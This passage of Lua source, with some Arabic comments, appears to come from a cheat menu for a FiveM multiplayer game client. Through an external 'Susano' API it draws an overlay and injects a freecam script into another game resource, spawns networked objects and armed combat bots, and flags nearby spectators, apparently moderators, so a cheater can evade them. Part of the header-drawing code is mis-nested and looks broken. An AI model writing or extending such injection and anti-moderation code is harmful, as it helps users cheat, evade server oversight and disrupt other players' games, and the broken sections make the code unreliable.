                    Susano.DrawTextWithFont(xPos, yPos, selectedText, MenuFont[1], MenuFont[2], textH, 0, 1, 0, 1) -- اللون الأخضر للمحدد
                else
                    Susano.DrawTextWithFont(xPos, yPos, feature.name, MenuFont[1], MenuFont[2], textH, 1, 1, 1, 1) -- اللون الأبيض للبقية
                end
            end
            Susano.SubmitFrame()
            Wait(0)
        end
        Susano.ResetAllFrames()
    end)
end

-- ===================================================================
-- 2. دوال التفعيل والتعطيل وحقن محاكي الكاميرا داخل اللعبة
-- ===================================================================
function EnableFreecam()
    local speedVal = Menu.FreecamSpeed or 0.5
    Susano.Communication.Inject("monitor", string.format([[
        _G.TX_FCamActiveFF = true
        local camera = nil
        _G.speed = %%f
        local fov = 85.0

        local playerPed = PlayerPedId()
        local coords = GetEntityCoords(playerPed)
        local heading = GetEntityHeading(playerPed)
        camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        SetCamCoord(camera, coords.x, coords.y, coords.z)
        SetCamRot(camera, 0.0, 0.0, heading, 2)
        SetCamFov(camera, fov)
        RenderScriptCams(true, false, 0, true, true)
        DisableAllControlActions(0)

        local function GetCamDirection(cam)
            local rot = GetCamRot(cam, 2)
            local radX = math.rad(rot.x)
            local radZ = math.rad(rot.z)
            return vector3(
                -math.sin(radZ) * math.abs(math.cos(radX)),
                math.cos(radZ) * math.abs(math.cos(radX)),
                math.sin(radX)
            )
        end

        CreateThread(function()
            while _G.TX_FCamActiveFF do
                Wait(0)
                if _G.TX_FCamActiveFF and camera then
                    DisableAllControlActions(0)
                    local camCoords = GetCamCoord(camera)
                    local camRot = GetCamRot(camera, 2)
                    
                    -- تحريك الكاميرا بالماوس
                    local mouseX = GetDisabledControlNormal(0, 1) * 5.0
                    local mouseY = GetDisabledControlNormal(0, 2) * 5.0
                    local newRotX = camRot.x - mouseY
                    local newRotZ = camRot.z - mouseX
                    
                    if newRotX > 89.0 then newRotX = 89.0 end
                    if newRotX < -89.0 then newRotX = -89.0 end
                    SetCamRot(camera, newRotX, 0.0, newRotZ, 2)
                    
                    local forward = GetCamDirection(camera)
                    local right = vector3(forward.y, -forward.x, 0.0)
                    local moveSpeed = _G.speed
                    
                    -- تسريع الحركة عند الضغط على Shift (Control 21)
                    if IsDisabledControlPressed(0, 21) then moveSpeed = _G.speed * 2.0 end
                    
                    -- أزرار الحركة W, S, A, D
                    if IsDisabledControlPressed(0, 32) then camCoords = camCoords + (forward * moveSpeed) end
                    if IsDisabledControlPressed(0, 33) then camCoords = camCoords - (forward * moveSpeed) end
                    if IsDisabledControlPressed(0, 34) then camCoords = camCoords - (right * moveSpeed) end
                    if IsDisabledControlPressed(0, 35) then camCoords = camCoords + (right * moveSpeed) end
                    
                    RequestCollisionAtCoord(camCoords.x, camCoords.y, camCoords.z)
                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                    
                    -- عند الضغط على كليك يسار (Left Click - Control 24) يقوم بعمل الفحص (Raycast) وإرسال الإحداثيات للمنيو
                    if IsDisabledControlJustReleased(0, 24) then
                        Wait(10)
                        local direction = GetCamDirection(camera)
                        local destination = camCoords + (direction * 1000.0)
                        local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, destination.x, destination.y, destination.z, -1, -1, 0)
                        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)
                        if hit then
                            if com and com.call then com.call("freeCamHit", entityHit, endCoords, camCoords) end
                        end
                    end
                    SetCamCoord(camera, camCoords.x, camCoords.y, camCoords.z)
                end
            end
            
            -- تنظيف الكاميرا عند الخروج من اللوب
            RenderScriptCams(false, false, 0, true, true)
            if DoesCamExist(camera) then DestroyCam(camera, false) end
            EnableAllControlActions(0)
            local playerCoords = GetEntityCoords(PlayerPedId())
            RequestCollisionAtCoord(playerCoords.x, playerCoords.y, playerCoords.z)
            SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
        end)
    ]], speedVal))
end

function DisableFreecam()
    Susano.InjectResource("monitor", [[
        _G.TX_FCamActiveFF = false
    ]])
end




function Menu.SpawnObject(modelName)
    local hash = tonumber(modelName) or GetHashKey(modelName)
    
    Citizen.CreateThread(function()
        RequestModel(hash)
        local timeout = 0
        while not HasModelLoaded(hash) and timeout < 200 do
            Citizen.Wait(10)
            timeout = timeout + 1
        end

        if not HasModelLoaded(hash) then
            Menu.Toast("Failed to load model: " .. tostring(modelName), "red")
            return
        end

        local coords
        local forward = vector3(0.0, 0.0, 0.0)
        local heading = 0.0

        if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
            local camCoords = GetCamCoord(Menu.FreecamCam)
            local camRot = GetCamRot(Menu.FreecamCam, 2)
            local rZ = math.rad(camRot.z)
            local rX = math.rad(camRot.x)
            forward = vector3(-math.sin(rZ) * math.abs(math.cos(rX)), math.cos(rZ) * math.abs(math.cos(rX)), math.sin(rX))
            coords = camCoords + forward * 5.0
            heading = camRot.z
        else
            local ped = PlayerPedId()
            local pedCoords = GetEntityCoords(ped)
            heading = GetEntityHeading(ped)
            local rZ = math.rad(heading)
            forward = vector3(-math.sin(rZ), math.cos(rZ), 0.0)
            coords = pedCoords + forward * 3.0
        end

        local networked = (Menu.NetworkedObjects == true)
        local obj = CreateObject(hash, coords.x, coords.y, coords.z, networked, true, false)
        if DoesEntityExist(obj) then
            SetEntityHeading(obj, heading)
            SetEntityAsMissionEntity(obj, true, true)
            if Menu.FreezeSpawnedObjects then
                FreezeEntityPosition(obj, true)
            end
            Menu.Toast("Object spawned: " .. tostring(modelName), "green")
        else
            Menu.Toast("Spawn failed!", "red")
        end
        SetModelAsNoLongerNeeded(hash)
    end)
end

function Menu.SpawnBot(pedModelName)
    local hash = tonumber(pedModelName) or GetHashKey(pedModelName)
    
    Citizen.CreateThread(function()
        RequestModel(hash)
        local timeout = 0
        while not HasModelLoaded(hash) and timeout < 200 do
            Citizen.Wait(10)
            timeout = timeout + 1
        end

        if not HasModelLoaded(hash) then
            Menu.Toast("Failed to load bot model: " .. tostring(pedModelName), "red")
            return
        end

        local coords
        local heading = 0.0

        if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
            local camCoords = GetCamCoord(Menu.FreecamCam)
            local camRot = GetCamRot(Menu.FreecamCam, 2)
            local rZ = math.rad(camRot.z)
            local rX = math.rad(camRot.x)
            local forward = vector3(-math.sin(rZ) * math.abs(math.cos(rX)), math.cos(rZ) * math.abs(math.cos(rX)), math.sin(rX))
            coords = camCoords + forward * 5.0
            heading = camRot.z
        else
            local ped = PlayerPedId()
            local pedCoords = GetEntityCoords(ped)
            heading = GetEntityHeading(ped)
            local rZ = math.rad(heading)
            local forward = vector3(-math.sin(rZ), math.cos(rZ), 0.0)
            coords = pedCoords + forward * 3.0
        end

        local networked = (Menu.NetworkedBots == true)
        local bot = CreatePed(26, hash, coords.x, coords.y, coords.z, heading, networked, false)
        if DoesEntityExist(bot) then
            SetEntityAsMissionEntity(bot, true, true)
            
            local weaponHash = GetHashKey("WEAPON_CARBINERIFLE")
            GiveWeaponToPed(bot, weaponHash, 999, true, true)
            SetPedCombatAttributes(bot, 5, true)
            SetPedCombatAttributes(bot, 46, true)
            SetPedFleeAttributes(bot, 0, false)
            
            Menu.Toast("Bot spawned: " .. tostring(pedModelName), "green")
        else
            Menu.Toast("Bot spawn failed!", "red")
        end
        SetModelAsNoLongerNeeded(hash)
    end)
end


function Menu.DrawActiveHUD()
    if not Menu.ShowActiveHUD then return end

    local scale = Menu.Scale or 1.0
    local pos = Menu.GetScaledPosition()
    local features = {}
    for name, enabled in pairs(Menu.ActiveFeatures) do
        if enabled then table.insert(features, name) end
    end
    table.sort(features)
    if #features == 0 then
        Menu.ActiveHUDHeight = 0
        return
    end

    local w = pos.width * 0.95
    local itemH = pos.itemHeight
    local headerH = pos.mainMenuHeight
    local x = 1920 - w - 20 * scale
    local y = 150 * scale -- Place it slightly lower so it doesn't overlap with Health HUD
    local totalH = headerH + #features * itemH

    -- Base Colors
    local bgR, bgG, bgB = 10, 10, 15
    local accR, accG, accB = Menu.Colors.SelectedBg.r, Menu.Colors.SelectedBg.g, Menu.Colors.SelectedBg.b

    -- Draw Main Header Background (Premium Glassmorphism style)
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, w, headerH, bgR / 255.0, bgG / 255.0, bgB / 255.0, 0.95, 4 * scale)
        Susano.DrawRectFilled(x, y + headerH - 2 * scale, w, 2 * scale, accR / 255.0, accG / 255.0, accB / 255.0, 0.9, 0)
    else
        Menu.DrawRoundedRect(x, y, w, headerH, bgR, bgG, bgB, 240, 4 * scale)
        Menu.DrawRect(x, y + headerH - 2 * scale, w, 2 * scale, accR, accG, accB, 230)
    end

    local title = "ACTIVE FEATURES [" .. #features .. "]"
    local titleSize = 13
    local titleW = 0
    if Susano and Susano.GetTextWidth then
        titleW = Susano.GetTextWidth(title, titleSize * scale)
    else
        titleW = #title * 7 * scale
    end
    Menu.DrawText(x + w / 2 - titleW / 2, y + headerH / 2 - 6 * scale, title, titleSize, 1.0, 1.0, 1.0, 0.95)

    for i, name in ipairs(features) do
        local iy = y + headerH + (i - 1) * itemH

        -- Item Background
        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(x, iy, w, itemH, bgR / 255.0, bgG / 255.0, bgB / 255.0, 0.85, 0)
            Susano.DrawRectFilled(x + 2 * scale, iy, 2 * scale, itemH, accR / 255.0, accG / 255.0, accB / 255.0, 0.9, 0) -- side accent
        else
            Menu.DrawRect(x, iy, w, itemH, bgR, bgG, bgB, 210)
            Menu.DrawRect(x + 2 * scale, iy, 2 * scale, itemH, accR, accG, accB, 230)
        end

        -- Feature Name
        Menu.DrawText(x + 12 * scale, iy + itemH / 2 - 7 * scale, name, 15, 1.0, 1.0, 1.0, 0.9)

        -- Toggle Icon / Indicator
        local toggleW = 28 * scale
        local toggleH = 12 * scale
        local toggleX = x + w - toggleW - 12 * scale
        local toggleY = iy + itemH / 2 - toggleH / 2
        local toggleR = toggleH / 2

        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(toggleX, toggleY, toggleW, toggleH, accR / 255.0, accG / 255.0, accB / 255.0, 0.9, toggleR)
            local knobSize = toggleH - 4 * scale
            local knobX = toggleX + toggleW - knobSize - 2 * scale
            local knobY = toggleY + 2 * scale
            Susano.DrawRectFilled(knobX, knobY, knobSize, knobSize, 1.0, 1.0, 1.0, 0.95, knobSize / 2)
        else
            Menu.DrawRoundedRect(toggleX, toggleY, toggleW, toggleH, accR, accG, accB, 230, toggleR)
            local knobSize = toggleH - 4 * scale
            local knobX = toggleX + toggleW - knobSize - 2 * scale
            local knobY = toggleY + 2 * scale
            Menu.DrawRoundedRect(knobX, knobY, knobSize, knobSize, 255, 255, 255, 240, knobSize / 2)
        end
    end

    -- Bottom border accent
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y + totalH, w, 2 * scale, accR / 255.0, accG / 255.0, accB / 255.0, 0.7, 0)
    else
        Menu.DrawRect(x, y + totalH, w, 2 * scale, accR, accG, accB, 180)
    end

    Menu.ActiveHUDHeight = totalH + 2 * scale
end

Menu.SpectatorList = {}
Menu.SpectatorLastCheck = 0
Menu.SpectatorCacheInterval = 2000

function Menu.DetectSpectatorsCached()
    local now = GetGameTimer()
    if now - Menu.SpectatorLastCheck < Menu.SpectatorCacheInterval then
        return
    end
    Menu.SpectatorLastCheck = now
    Menu.SpectatorList = {}

    local myPed = PlayerPedId()
    local myCoords = GetEntityCoords(myPed)
    for _, pid in ipairs(GetActivePlayers()) do
        if pid ~= PlayerId() then
            local tPed = GetPlayerPed(pid)
            if DoesEntityExist(tPed) then
                local tCoords = GetEntityCoords(tPed)
                local dist = #(myCoords - tCoords)
                
                -- Detect if invisible, vanished, or close
                local isInvisible = not IsEntityVisible(tPed) or not IsEntityOccluded(tPed)
                
                if isInvisible or dist < 12.0 then
                    if dist < 250.0 then
                        local isSpectating = (dist < 8.0) or (not IsEntityVisible(tPed) and dist < 15.0)
                        table.insert(Menu.SpectatorList, {
                            id = GetPlayerServerId(pid),
                            name = GetPlayerName(pid) or "Unknown",
                            spectating = isSpectating,
                            dist = dist
                        })
                    end
                end
            end
        end
    end
end

function Menu.DrawSpectatorHUD()
    if not Menu.ShowSpectators then return end

    Menu.DetectSpectatorsCached()

    local screenWidth = 1920
    local screenHeight = 1080
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenWidth = Susano.GetScreenWidth()
        screenHeight = Susano.GetScreenHeight()
    end

    local w = 340
    local x = screenWidth - w - 25
    local y = 25

    if Menu.ShowActiveHUD and Menu.ActiveHUDHeight and Menu.ActiveHUDHeight > 0 then
        y = y + Menu.ActiveHUDHeight + 10
    end

    -- Back glow top-right
    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(screenWidth - 200, 0, 200, 200, 0.0, 0.95, 1.0, 0.04, 100)
    end

    local count = #Menu.SpectatorList
    local itemH = 35
    local headerH = 65
    local listH = count > 0 and (count * itemH + 10) or 40
    local totalH = headerH + listH

    -- Glassmorphic container wrapper
    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, w, totalH, 0.04, 0.04, 0.06, 0.5, 16)
        local borderAlpha = 0.05
        Susano.DrawRectFilled(x, y, w, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
        Susano.DrawRectFilled(x, y + totalH - 1, w, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
        Susano.DrawRectFilled(x, y, 1, totalH, 1.0, 1.0, 1.0, borderAlpha, 0)
        Susano.DrawRectFilled(x + w - 1, y, 1, totalH, 1.0, 1.0, 1.0, borderAlpha, 0)
    else
        Menu.DrawRect(x, y, w, totalH, 10, 10, 15, 130)
    end

    -- Title: SPECTATE
    local titleText = "SPECTATE"
    local titleSize = 20
    local titleW = 0
    if Susano and Susano.GetTextWidth then
        titleW = Susano.GetTextWidth(titleText, titleSize)
    else
        titleW = string.len(titleText) * 9
    end
    local titleX = x + (w - titleW) / 2
    local titleY = y + 15
    Menu.DrawText(titleX, titleY, titleText, titleSize, 0.9, 0.98, 1.0, 1.0)

    -- Neon line
    local lineW = w - 90
    local lineH = 2.5
    local lineX = x + (w - lineW) / 2
    local lineY = y + 45
    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(lineX, lineY, lineW, lineH, 0.0, 0.95, 1.0, 0.6, 2)
        Susano.DrawRectFilled(lineX, lineY - 0.5, lineW, lineH + 1, 0.5, 0.0, 1.0, 0.2, 4)
    else
        Menu.DrawRect(lineX, lineY, lineW, lineH, 0, 242, 254, 200)
    end

    -- Draw spectator list
    if count == 0 then
        local textY = y + headerH + 10
        local noSpecText = "No spectators nearby"
        local textW = 0
        if Susano and Susano.GetTextWidth then
            textW = Susano.GetTextWidth(noSpecText, 12)
        else
            textW = string.len(noSpecText) * 7
        end
        Menu.DrawText(x + (w - textW) / 2, textY, noSpecText, 12, 0.5, 0.5, 0.6, 0.7)
    else
        for i, spec in ipairs(Menu.SpectatorList) do
            local iy = y + headerH + (i - 1) * itemH
            
            local nameText = string.format("[%d] %s", spec.id, spec.name)
            if string.len(nameText) > 18 then
                nameText = string.sub(nameText, 1, 16) .. ".."
            end
            Menu.DrawText(x + 20, iy + 6, nameText, 13, 0.95, 0.95, 0.95, 1.0)

            local badgeText = ""
            local br, bg, bb = 0.5, 0.5, 0.5
            if spec.spectating then
                badgeText = "SPECTATING"
                br, bg, bb = 1.0, 0.2, 0.2
            else
                badgeText = string.format("HIDDEN (%.0fm)", spec.dist)
                br, bg, bb = 0.0, 0.95, 1.0
            end

            local badgeW = 0
            if Susano and Susano.GetTextWidth then
                badgeW = Susano.GetTextWidth(badgeText, 11)
            else
                badgeW = string.len(badgeText) * 6
            end
            Menu.DrawText(x + w - badgeW - 20, iy + 7, badgeText, 11, br, bg, bb, 0.9)
        end
    end
end






function Menu.DrawRect(x, y, width, height, r, g, b, a)
    a = a or 1.0
    r = r or 1.0
    g = g or 1.0
    b = b or 1.0

    if r > 1.0 then r = r / 255.0 end
    if g > 1.0 then g = g / 255.0 end
    if b > 1.0 then b = b / 255.0 end
    if a > 1.0 then a = a / 255.0 end

    if Susano.DrawFilledRect then
        Susano.DrawFilledRect(x, y, width, height, r, g, b, a)
    elseif Susano.FillRect then
        Susano.FillRect(x, y, width, height, r, g, b, a)
    elseif Susano.DrawRect then
        for i = 0, height - 1 do
            Susano.DrawRect(x, y + i, width, 1, r, g, b, a)
        end
    end
end

function Menu.DrawText(x, y, text, size_px, r, g, b, a)
    if text == nil then
        text = ""
    end

    local scale = Menu.Scale or 1.0
    size_px = (size_px or 16) * scale
    r = r or 1.0
    g = g or 1.0
    b = b or 1.0
    a = a or 1.0

    if r > 1.0 then r = r / 255.0 end
    if g > 1.0 then g = g / 255.0 end
    if b > 1.0 then b = b / 255.0 end
    if a > 1.0 then a = a / 255.0 end

    Susano.DrawText(x, y, text, size_px, r, g, b, a)
end

function Menu.DrawRoundedRect(x, y, width, height, r, g, b, a, radius)
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, width, height,
            r > 1 and r/255 or r,
            g > 1 and g/255 or g,
            b > 1 and b/255 or b,
            a > 1 and a/255 or a,
            radius or 0)
    else
        Menu.DrawRect(x, y, width, height, r, g, b, a)
    end
end

function Menu.DrawHeader()
    local scaledPos = Menu.GetScaledPosition()
    local scale = Menu.Scale or 1.0
    local x = scaledPos.x
    local y = scaledPos.y
    local width = scaledPos.width - 1
    local height = scaledPos.headerHeight
    local radius = scaledPos.headerRadius
    local bannerHeight = Menu.Banner.height * scale

    if Menu.Banner.enabled and Menu.bannerWidth and Menu.bannerWidth > 0 and Menu.bannerHeight and Menu.bannerHeight > 0 then
        bannerHeight = width * (Menu.bannerHeight / Menu.bannerWidth)
        Menu.Position.headerHeight = bannerHeight / scale
    end

    if Menu.Banner.enabled then
        if Menu.bannerTexture and Menu.bannerTexture > 0 and Susano and Susano.DrawImage then
            Susano.DrawImage(Menu.bannerTexture, x, y, width, bannerHeight, 1, 1, 1, 1, 0)

            if radius > 0 then
                for i = 0, radius - 1 do
                    local distanceFromTop = radius - (i + 0.5)
                    local mask_width = math.ceil(radius - math.sqrt(math.max(0, radius * radius - distanceFromTop * distanceFromTop)))
                    local y_pos = y + i

                    if mask_width > 0 then
                        if Susano and Susano.DrawRectFilled then
                            Susano.DrawRectFilled(x, y_pos, mask_width, 1,
                                Menu.Colors.BackgroundDark.r / 255.0, Menu.Colors.BackgroundDark.g / 255.0, Menu.Colors.BackgroundDark.b / 255.0, 1.0, 0.0)
                        else
                            Menu.DrawRect(x, y_pos, mask_width, 1,
                                Menu.Colors.BackgroundDark.r, Menu.Colors.BackgroundDark.g, Menu.Colors.BackgroundDark.b, 255)
                        end
                    end
                end

                    if mask_width > 0 then
                        if Susano and Susano.DrawRectFilled then
                            Susano.DrawRectFilled(x + width - mask_width, y_pos, mask_width, 1,
                                Menu.Colors.BackgroundDark.r / 255.0, Menu.Colors.BackgroundDark.g / 255.0, Menu.Colors.BackgroundDark.b / 255.0, 1.0, 0.0)
                        else
                            Menu.DrawRect(x + width - mask_width, y_pos, mask_width, 1,
                                Menu.Colors.BackgroundDark.r, Menu.Colors.BackgroundDark.g, Menu.Colors.BackgroundDark.b, 255)
                        end
                    end
                end
            end
        else
            Menu.DrawTopRoundedRect(x, y, width, height, Menu.Colors.HeaderPink.r, Menu.Colors.HeaderPink.g, Menu.Colors.HeaderPink.b, 255, radius)

            local logoX = x + width / 2 - 12
            local logoY = y + height / 2 - 20
            Menu.DrawText(logoX, logoY, "P", 44, 1.0, 1.0, 1.0, 1.0)
        end
    else
        Menu.DrawRect(x, y, width, height, Menu.Colors.HeaderPink.r, Menu.Colors.HeaderPink.g, Menu.Colors.HeaderPink.b, 255)

        local logoX = x + width / 2 - 12
        local logoY = y + height / 2 - 20
        Menu.DrawText(logoX, logoY, "P", 44, 1.0, 1.0, 1.0, 1.0)
    end
end

function Menu.DrawScrollbar(x, startY, visibleHeight, selectedIndex, totalItems, isMainMenu, menuWidth)
    if totalItems < 1 then
        return
    end

    local scaledPos = Menu.GetScaledPosition()
    local scrollbarWidth = scaledPos.scrollbarWidth
    local scrollbarPadding = scaledPos.scrollbarPadding
    local width = menuWidth or scaledPos.width

    local scrollbarX
    if Menu.ScrollbarPosition == 2 then
        scrollbarX = x + width + scrollbarPadding
    else
        scrollbarX = x - scrollbarWidth - scrollbarPadding
    end

    local scrollbarY = startY
    local scrollbarHeight = visibleHeight

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(scrollbarX, scrollbarY, scrollbarWidth, scrollbarHeight,
            0.08, 0.08, 0.08, 0.70,
            scrollbarWidth / 2)
    else
        Menu.DrawRoundedRect(scrollbarX, scrollbarY, scrollbarWidth, scrollbarHeight,
            20, 20, 20, 180, scrollbarWidth / 2)
    end

    local adjustedIndex = selectedIndex
    if isMainMenu then
        adjustedIndex = selectedIndex - 1
    end

    local thumbHeight = scrollbarHeight
    local thumbY = scrollbarY

    if not Menu.scrollbarY then
        Menu.scrollbarY = thumbY
    end
    if not Menu.scrollbarHeight then
        Menu.scrollbarHeight = thumbHeight
    end

    local smoothSpeed = 0.7
    Menu.scrollbarY = Menu.scrollbarY + (thumbY - Menu.scrollbarY) * smoothSpeed
    Menu.scrollbarHeight = Menu.scrollbarHeight + (thumbHeight - Menu.scrollbarHeight) * smoothSpeed

    local thumbPadding = 1
    local bgR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or (0 / 255.0)   -- Blue: 0
local bgG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or (150 / 255.0)  -- Blue: 150
local bgB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or (255 / 255.0)  -- Blue: 255

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(scrollbarX + thumbPadding, Menu.scrollbarY + thumbPadding,
            scrollbarWidth - (thumbPadding * 2), Menu.scrollbarHeight - (thumbPadding * 2),
            bgR, bgG, bgB, 0.95,
            (scrollbarWidth - (thumbPadding * 2)) / 2)
    else
        Menu.DrawRoundedRect(scrollbarX + thumbPadding, Menu.scrollbarY + thumbPadding,
            scrollbarWidth - (thumbPadding * 2), Menu.scrollbarHeight - (thumbPadding * 2),
            bgR * 255, bgG * 255, bgB * 255, 242,
            (scrollbarWidth - (thumbPadding * 2)) / 2)
    end
end

function Menu.DrawTabs(category, x, startY, width, tabHeight)
    local scale = Menu.Scale or 1.0
    if not category or not category.hasTabs or not category.tabs then
        return
    end

    local numTabs = #category.tabs
    local tabWidth = width / numTabs
    local currentX = x

    for i, tab in ipairs(category.tabs) do
        local tabX = currentX
        local currentTabWidth
        if i == numTabs then
            currentTabWidth = (x + width) - currentX
        else
            currentTabWidth = tabWidth + (0.5 * scale)
        end

        local isSelected = (i == Menu.CurrentTab)

        if isSelected then
            local targetWidth = currentTabWidth
            if i == numTabs then
                targetWidth = math.min(currentTabWidth, (x + width) - tabX - (1 * scale))
            end

            if Menu.TabSelectorX == 0 then
                Menu.TabSelectorX = tabX
                Menu.TabSelectorWidth = targetWidth
            end

            local smoothSpeed = Menu.SmoothFactor
            Menu.TabSelectorX = Menu.TabSelectorX + (tabX - Menu.TabSelectorX) * smoothSpeed
            Menu.TabSelectorWidth = Menu.TabSelectorWidth + (targetWidth - Menu.TabSelectorWidth) * smoothSpeed

            if math.abs(Menu.TabSelectorX - tabX) < (0.5 * scale) then Menu.TabSelectorX = tabX end
            if math.abs(Menu.TabSelectorWidth - targetWidth) < (0.5 * scale) then Menu.TabSelectorWidth = targetWidth end

            local drawX = Menu.TabSelectorX
            local drawWidth = Menu.TabSelectorWidth

            local baseR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0)
            local baseG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0)
            local baseB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0)
            local darkenAmount = 0.4

            local gradientSteps = 20
            local stepHeight = tabHeight / gradientSteps
            local selectorWidth = drawWidth
            local selectorX = drawX

            for step = 0, gradientSteps - 1 do
                local stepY = startY + (step * stepHeight)
                local actualStepHeight = stepHeight
                local maxY = startY + tabHeight
                if stepY + actualStepHeight > maxY then
                    actualStepHeight = maxY - stepY
                end
                if actualStepHeight > 0 and stepY < maxY then
                    local stepGradientFactor = step / (gradientSteps - 1)
                    local stepDarken = (1 - stepGradientFactor) * darkenAmount

                    local stepR = math.max(0, baseR - stepDarken)
                    local stepG = math.max(0, baseG - stepDarken)
                    local stepB = math.max(0, baseB - stepDarken)

                    if Susano and Susano.DrawRectFilled then
                        Susano.DrawRectFilled(selectorX, stepY, selectorWidth, actualStepHeight, stepR, stepG, stepB, 0.9, 0.0)
                    else
                        Menu.DrawRect(selectorX, stepY, selectorWidth, actualStepHeight, stepR * 255, stepG * 255, stepB * 255, 220)
                    end
                end
            end

            Menu.DrawRect(selectorX, startY, (3 * scale), tabHeight, Menu.Colors.SelectedBg.r, Menu.Colors.SelectedBg.g, Menu.Colors.SelectedBg.b, 255)
        end

        Menu.DrawRect(tabX, startY, currentTabWidth, tabHeight, Menu.Colors.BackgroundDark.r, Menu.Colors.BackgroundDark.g, Menu.Colors.BackgroundDark.b, isSelected and 0 or 50)

        local textSize = 16
        local scaledTextSize = textSize * scale
        local textY = startY + tabHeight / 2 - (scaledTextSize / 2) + (1 * scale)
        local textWidth = 0
        if Susano and Susano.GetTextWidth then
            textWidth = Susano.GetTextWidth(tab.name, scaledTextSize)
        else
            textWidth = string.len(tab.name) * 9 * scale
        end
        local textX = tabX + (currentTabWidth / 2) - (textWidth / 2)
        Menu.DrawText(textX, textY, tab.name, textSize, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0)

        currentX = currentX + tabWidth
    end
end

local function findNextNonSeparator(items, startIndex, direction)
    local index = startIndex
    local attempts = 0
    local maxAttempts = #items

    while attempts < maxAttempts do
        index = index + direction
        if index < 1 then
            index = #items
        elseif index > #items then
            index = 1
        end

        if items[index] and not items[index].isSeparator then
            return index
        end

        attempts = attempts + 1
    end

    return startIndex
end

function Menu.DrawItem(x, itemY, width, itemHeight, item, isSelected, currentTabName)
    if item.isSeparator then
        Menu.DrawRoundedRect(x + 2, itemY, width - 4, itemHeight, Menu.Colors.BackgroundDark.r, Menu.Colors.BackgroundDark.g, Menu.Colors.BackgroundDark.b, 50, 4)

        if item.separatorText then
            local textY = itemY + itemHeight / 2 - 8
            local textSize = 16

            local textWidth = 0
            if Susano and Susano.GetTextWidth then
                textWidth = Susano.GetTextWidth(item.separatorText, textSize)
            else
                textWidth = string.len(item.separatorText) * 8
            end

            local textX = x + (width / 2) - (textWidth / 2)

            Menu.DrawText(textX, textY, item.separatorText, textSize, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0)

            local barY = itemY + (itemHeight / 2)
            local barSpacing = 8
            local barMaxLength = 80
            local barHeight = 1
            local barRadius = 0.5

            local leftBarX = textX - barSpacing - barMaxLength
            local leftBarWidth = math.min(barMaxLength, textX - leftBarX - barSpacing)
            if leftBarWidth > 0 and leftBarX >= x + 15 then
                if Susano and Susano.DrawRectFilled then
                    Susano.DrawRectFilled(leftBarX, math.floor(barY), leftBarWidth, barHeight,
                        Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 100 / 255.0,
                        barRadius)
                else
                    Menu.DrawRect(leftBarX, math.floor(barY), leftBarWidth, barHeight, Menu.Colors.TextWhite.r, Menu.Colors.TextWhite.g, Menu.Colors.TextWhite.b, 100)
                end
            end

            local rightBarX = textX + textWidth + barSpacing
            local rightBarWidth = math.min(barMaxLength, (x + width - 15) - rightBarX)
            if rightBarWidth > 0 and rightBarX + rightBarWidth <= x + width - 15 then
                if Susano and Susano.DrawRectFilled then
                    Susano.DrawRectFilled(rightBarX, math.floor(barY), rightBarWidth, barHeight,
                        Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 100 / 255.0,
                        barRadius)
                else
                    Menu.DrawRect(rightBarX, math.floor(barY), rightBarWidth, barHeight, Menu.Colors.TextWhite.r, Menu.Colors.TextWhite.g, Menu.Colors.TextWhite.b, 100)
                end
            end
        end
        return
    end

    Menu.DrawRoundedRect(x + 2, itemY + 1, width - 4, itemHeight - 2, Menu.Colors.BackgroundDark.r, Menu.Colors.BackgroundDark.g, Menu.Colors.BackgroundDark.b, 50, 4)

    if isSelected then
        if Menu.SelectorY == 0 then
            Menu.SelectorY = itemY
        end

        local smoothSpeed = Menu.SmoothFactor
        Menu.SelectorY = Menu.SelectorY + (itemY - Menu.SelectorY) * smoothSpeed
        if math.abs(Menu.SelectorY - itemY) < 0.5 then
            Menu.SelectorY = itemY
        end

local drawY = Menu.SelectorY

local baseR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or (0 / 255.0)     -- Blue: 0
local baseG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or (150 / 255.0)  -- Blue: 150
